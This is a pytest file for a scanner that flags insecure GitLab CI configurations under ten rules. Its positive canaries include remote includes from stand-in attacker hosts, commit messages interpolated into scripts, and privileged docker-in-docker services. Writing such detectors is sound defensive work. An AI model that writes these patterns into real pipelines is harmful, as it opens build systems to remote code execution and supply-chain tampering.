"""Tests for scripts/lib/gitlab_ci_patterns.py.

Pattern-coverage tests for the Wave-36 distill-round-22 GitLab CI
specific security gap catalogue (10 rules). Each rule has 2 tests:
one positive (canary fires) and one negative (safe variant does not fire).
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import gitlab_ci_patterns as glc  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_contains_all_ten_rules() -> None:
    """RULES must expose all 10 documented glc- rule IDs."""
    rule_ids = {r.id for r in glc.RULES}
    expected = {
        "glc-include-external-url",
        "glc-image-variable-injection",
        "glc-commit-message-script-rce",
        "glc-rules-untrusted-variable",
        "glc-services-privileged-container",
        "glc-cache-key-variable-injection",
        "glc-dependencies-all-jobs",
        "glc-trigger-no-strategy",
        "glc-extends-external-template",
        "glc-runner-tag-wildcard",
    }
    assert expected == rule_ids
    assert len(glc.RULES) == 10


def test_every_rule_has_valid_severity_and_owasp() -> None:
    """Every rule maps to a valid ASI- prefix and a known severity."""
    valid_severities = {"CRITICAL", "HIGH", "MAJOR", "MEDIUM", "LOW", "INFO"}
    for rule in glc.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in valid_severities, rule.id
        assert rule.description.strip(), rule.id
        assert rule.name.strip(), rule.id


# ---------- R1 : glc-include-external-url --------------------------------


def test_include_external_url_fires_on_untrusted_domain() -> None:
    """glc-include-external-url fires when remote: points to an unknown host."""
    text = """
include:
  - remote: 'https://attacker.example.com/ci-templates/inject.yml'
"""
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-include-external-url" in ids


def test_include_external_url_silent_for_gitlab_com() -> None:
    """glc-include-external-url does NOT fire for gitlab.com remote includes."""
    text = """
include:
  - remote: 'https://gitlab.com/org/project/-/raw/main/.shared-ci.yml'
"""
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-include-external-url" not in ids


# ---------- R2 : glc-image-variable-injection ----------------------------


def test_image_variable_injection_fires_on_ci_commit_ref_name() -> None:
    """glc-image-variable-injection fires when image: uses $CI_COMMIT_REF_NAME."""
    text = "  image: $CI_COMMIT_REF_NAME\n"
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-image-variable-injection" in ids


def test_image_variable_injection_silent_for_literal_image() -> None:
    """glc-image-variable-injection does NOT fire for a hard-coded image tag."""
    text = "  image: python:3.12-slim\n"
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-image-variable-injection" not in ids


# ---------- R3 : glc-commit-message-script-rce ---------------------------


def test_commit_message_rce_fires_on_before_script() -> None:
    """glc-commit-message-script-rce fires when before_script uses $CI_COMMIT_MESSAGE."""
    text = """
before_script:
  - echo "$CI_COMMIT_MESSAGE"
"""
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-commit-message-script-rce" in ids


def test_commit_message_rce_fires_on_after_script_title() -> None:
    """glc-commit-message-script-rce fires when after_script uses $CI_COMMIT_TITLE."""
    text = """
after_script:
  - git tag -a release -m "$CI_COMMIT_TITLE"
"""
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-commit-message-script-rce" in ids


# ---------- R4 : glc-rules-untrusted-variable ----------------------------


def test_rules_untrusted_variable_fires_on_branch_if() -> None:
    """glc-rules-untrusted-variable fires when rules:if: references $CI_COMMIT_BRANCH."""
    text = """
rules:
  - if: '$CI_COMMIT_BRANCH == "main"'
    when: always
"""
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-rules-untrusted-variable" in ids


def test_rules_untrusted_variable_silent_for_ci_pipeline_source() -> None:
    """glc-rules-untrusted-variable does NOT fire for $CI_PIPELINE_SOURCE (non-attacker var)."""
    text = """
rules:
  - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
    when: always
"""
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-rules-untrusted-variable" not in ids


# ---------- R5 : glc-services-privileged-container -----------------------


def test_services_privileged_fires_on_privileged_true() -> None:
    """glc-services-privileged-container fires on privileged: true inside services."""
    text = """
services:
  - name: docker:dind
    privileged: true
"""
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-services-privileged-container" in ids


def test_services_privileged_fires_on_docker_dind_image() -> None:
    """glc-services-privileged-container fires when services: contains docker:dind image."""
    text = """
services:
  - image: docker:24.0-dind
"""
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-services-privileged-container" in ids


# ---------- R6 : glc-cache-key-variable-injection ------------------------


def test_cache_key_variable_fires_on_ref_slug() -> None:
    """glc-cache-key-variable-injection fires when cache:key: uses $CI_COMMIT_REF_SLUG."""
    text = """
cache:
  key: $CI_COMMIT_REF_SLUG
  paths:
    - .cache/
"""
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-cache-key-variable-injection" in ids


def test_cache_key_variable_silent_for_hash_key() -> None:
    """glc-cache-key-variable-injection does NOT fire for a static hash-based key."""
    text = """
cache:
  key:
    files:
      - Gemfile.lock
  paths:
    - vendor/
"""
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-cache-key-variable-injection" not in ids


# ---------- R7 : glc-dependencies-all-jobs -------------------------------


def test_dependencies_all_jobs_fires_on_empty_list() -> None:
    """glc-dependencies-all-jobs fires when dependencies: [] is present."""
    text = "  dependencies: []\n"
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-dependencies-all-jobs" in ids


def test_dependencies_all_jobs_silent_for_explicit_list() -> None:
    """glc-dependencies-all-jobs does NOT fire when dependencies names specific jobs."""
    text = "  dependencies:\n    - build-job\n"
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-dependencies-all-jobs" not in ids


# ---------- R8 : glc-trigger-no-strategy ---------------------------------


def test_trigger_no_strategy_fires_when_strategy_absent() -> None:
    """glc-trigger-no-strategy fires when trigger:project: lacks strategy: depend."""
    text = """
deploy:
  trigger:
    project: org/deploy-pipeline
    branch: main
"""
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-trigger-no-strategy" in ids


def test_trigger_no_strategy_silent_when_strategy_depend_present() -> None:
    """glc-trigger-no-strategy does NOT fire when strategy: depend is present."""
    text = """
deploy:
  trigger:
    project: org/deploy-pipeline
    strategy: depend
"""
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-trigger-no-strategy" not in ids


# ---------- R9 : glc-extends-external-template ---------------------------


def test_extends_external_template_escalates_with_external_include() -> None:
    """glc-extends-external-template fires HIGH when external include is also present."""
    text = """
include:
  - remote: 'https://evil.example.com/template.yml'

my-job:
  extends: .ExternalTemplate
  script:
    - echo hello
"""
    findings = glc.scan_text(text)
    extends_findings = [f for f in findings if f.rule_id == "glc-extends-external-template"]
    assert extends_findings, "Expected at least one extends finding"
    assert extends_findings[0].severity == "HIGH"


def test_extends_external_template_info_when_no_external_include() -> None:
    """glc-extends-external-template fires INFO (not HIGH) without external include."""
    text = """
include:
  - local: .local-template.yml

my-job:
  extends: .LocalTemplate
  script:
    - echo hello
"""
    findings = glc.scan_text(text)
    extends_findings = [f for f in findings if f.rule_id == "glc-extends-external-template"]
    assert extends_findings, "Expected at least one extends finding"
    assert extends_findings[0].severity == "INFO"


# ---------- R10 : glc-runner-tag-wildcard --------------------------------


def test_runner_tag_wildcard_fires_on_empty_tags() -> None:
    """glc-runner-tag-wildcard fires when tags: [] is present."""
    text = "  tags: []\n"
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-runner-tag-wildcard" in ids


def test_runner_tag_wildcard_fires_on_shared_tag() -> None:
    """glc-runner-tag-wildcard fires when tags: contains 'docker' (shared runner label)."""
    text = """
my-job:
  tags:
    - docker
  script:
    - echo hi
"""
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-runner-tag-wildcard" in ids


def test_runner_tag_wildcard_silent_for_specific_private_tag() -> None:
    """glc-runner-tag-wildcard does NOT fire for specific private runner tags."""
    text = """
my-job:
  tags:
    - prod-k8s-runner-eu
  script:
    - echo hi
"""
    ids = {f.rule_id for f in glc.scan_text(text)}
    assert "glc-runner-tag-wildcard" not in ids
